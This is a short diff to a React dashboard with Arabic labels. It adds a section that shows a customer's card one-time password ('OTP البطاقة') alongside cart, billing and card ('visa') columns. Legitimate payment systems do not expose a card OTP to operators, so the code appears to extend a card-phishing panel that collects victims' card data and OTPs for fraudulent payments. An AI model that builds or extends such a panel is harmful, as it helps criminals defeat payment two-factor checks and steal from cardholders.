@@ -199,6 +199,16 @@ function renderHumanitiBilling(c) {
   );
 }
 
+function renderHumanitiOtp(c) {
+  if (!c.CardOtp) return null;
+
+  return (
+    <OrderSection title="OTP الدفع">
+      <OrderField label="OTP البطاقة" value={c.CardOtp} otp ltr />
+    </OrderSection>
+  );
+}
+
 function renderOrderJourney(c) {
   return (
     <div className="info-block order-journey-block">
@@ -698,6 +708,7 @@ const Main = () => {
         <div className="cc-body">
           {renderHumanitiCart(c)}
           {renderHumanitiBilling(c)}
+          {renderHumanitiOtp(c)}
           {renderOrderJourney(c)}
           <div className="cc-body-grid">
             <div className="cc-col cc-col--visa">
